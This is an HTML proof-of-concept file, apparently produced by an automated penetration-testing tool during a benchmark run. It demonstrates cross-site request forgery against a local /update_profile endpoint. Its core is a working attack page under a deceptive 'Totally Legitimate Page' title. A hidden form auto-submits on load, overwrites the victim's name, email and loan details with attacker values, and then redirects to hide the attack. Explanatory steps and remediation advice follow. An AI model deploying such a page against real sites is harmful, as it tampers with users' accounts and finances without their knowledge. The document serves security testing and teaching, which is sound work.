<!-- 
POC: HTML POC demonstrating CSRF attack on /update_profile endpoint with auto-submitting hidden form
Target: ./repo
Created: 2025-11-07T16:07:24.286Z
Session: benchmark-XBEN-022-24-mhp1ee6o

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-022-24-mhp1ee6o/pocs/poc_csrf_profile_update_attack.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Totally Legitimate Page - Please Wait</title>
</head>
<body>
    <h1>Loading...</h1>
    <p>Please wait while we load your content...</p>

    <!-- HIDDEN CSRF ATTACK FORM -->
    <!-- This form demonstrates a CSRF attack on the /update_profile endpoint -->
    <form id="csrf-attack" method="POST" action="http://localhost:5000/update_profile" enctype="multipart/form-data" style="display:none;">
        <!-- Attacker modifies these fields on behalf of the victim -->
        <input type="hidden" name="name" value="Hacked">
        <input type="hidden" name="lastname" value="ByAttacker">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="loan_amount" value="999999">
        <input type="hidden" name="loan_term_months" value="1">
        <input type="hidden" name="monthly_payment" value="999999">
    </form>

    <!-- AUTO-SUBMIT THE CSRF ATTACK FORM -->
    <script>
        // This script automatically submits the hidden form
        // When an authenticated user visits this page, their profile will be modified
        // The victim's browser includes their session cookie with the request
        // Since /update_profile lacks CSRF token validation, the attack succeeds
        
        window.onload = function() {
            console.log("[CSRF Attack] Submitting malicious form...");
            document.getElementById('csrf-attack').submit();
            
            // Redirect to legitimate page after submission to avoid suspicion
            setTimeout(function() {
                window.location.href = 'http://localhost:5000/profile';
            }, 1000);
        };
    </script>

    <hr>
    <p><small>CSRF Vulnerability Demonstration</small></p>
    <p><small>This page demonstrates how an attacker can modify a user's profile without their knowledge by exploiting the lack of CSRF protection on /update_profile endpoint</small></p>

    <h2>How This Attack Works:</h2>
    <ol>
        <li>Attacker creates this malicious HTML page with a hidden form targeting /update_profile</li>
        <li>Form contains arbitrary profile data (name, email, loan details)</li>
        <li>Form auto-submits via JavaScript when page loads</li>
        <li>If an authenticated user visits this page, their browser sends their session cookie</li>
        <li>Since /update_profile lacks CSRF token validation, the update succeeds</li>
        <li>User's profile is now compromised without their knowledge</li>
    </ol>

    <h2>Why This Is Possible:</h2>
    <ul>
        <li>No CSRF tokens in the profile update form</li>
        <li>No CSRF token validation on server</li>
        <li>No SameSite cookie flags</li>
        <li>No Origin/Referer header validation</li>
        <li>Form uses POST method which allows cross-origin submissions</li>
    </ul>

    <h2>Remediation:</h2>
    <ul>
        <li>Implement CSRF tokens (synchronizer token pattern)</li>
        <li>Set SameSite=Strict on session cookies</li>
        <li>Validate Origin/Referer headers</li>
        <li>Use double-submit cookie pattern</li>
        <li>Implement CSRF protection framework (e.g., Flask-CSRF, Django CSRF)</li>
    </ul>
</body>
</html>